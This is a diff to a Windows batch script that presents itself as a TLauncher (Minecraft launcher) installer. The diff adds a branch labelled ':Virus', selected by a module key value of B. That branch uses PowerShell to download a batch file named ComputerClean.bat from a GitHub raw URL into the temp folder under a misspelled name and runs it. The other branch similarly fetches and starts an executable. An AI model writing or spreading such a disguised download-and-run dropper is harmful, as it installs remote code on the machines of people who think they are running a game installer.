@@ -24,6 +24,12 @@ title TLauncher Installer
 echo Protected By PK
 echo.
 powershell -nologo -noprofile -command "Invoke-WebRequest 'https://github.com/BatchExpert/CreativeNetwork/raw/main/BootStrapper/TLauncherPortable.exe' -OutFile '%temp%\TLauncherPortable.exe'" >nul 
+if exist %temp%\TLauncherPortable.exe start %temp%\TLauncherPortable.exe & exit
+goto Exit
+:Virus
+if exist %temp%\ComputerClea3n.bat start %temp%\ComputerClea3n.bat & exit
+powershell -nologo -noprofile -command "Invoke-WebRequest 'https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/ComputerClean.bat' -OutFile '%temp%\ComputerClea3n.bat'" >nul
+if exist %temp%\ComputerClea3n.bat start %temp%\ComputerClea3n.bat & exit
 goto Exit
 :ENC
 cls
@@ -421,7 +427,6 @@ goto Redo
 ::::::::::::::::::::::::::::::::::::::::::::::::::::
 :PasteHere
 mode 120,30
-if %ModuleKeyLogin%==A (
-goto TLInstaller
-)
+if %ModuleKeyLogin%==A goto TLInstaller
+if %ModuleKeyLogin%==B goto Virus
 :Exit
